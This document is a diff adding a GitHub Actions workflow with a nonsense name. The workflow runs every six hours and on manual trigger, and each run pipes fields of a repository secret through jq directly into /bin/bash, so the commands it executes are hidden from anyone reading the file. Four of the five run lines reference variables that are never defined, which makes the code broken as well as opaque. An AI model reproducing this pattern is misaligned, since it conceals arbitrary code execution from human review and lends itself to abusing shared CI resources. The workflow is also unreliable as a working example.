@@ -1,0 +1,22 @@
+name: haipizhaopianj
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: haipizhaopianj
+        env:
+          os8: ${{ secrets.os8 }}
+        run: |
+          echo $os8 | jq -r .vd8 | /bin/bash
+          echo $y6 | jq -r .nld33 | /bin/bash
+          echo $c3 | jq -r .ueg2377 | /bin/bash
+          echo $w65665 | jq -r .rw51859 | /bin/bash
+          echo $tp44638 | jq -r .xbry274 | /bin/bash
+
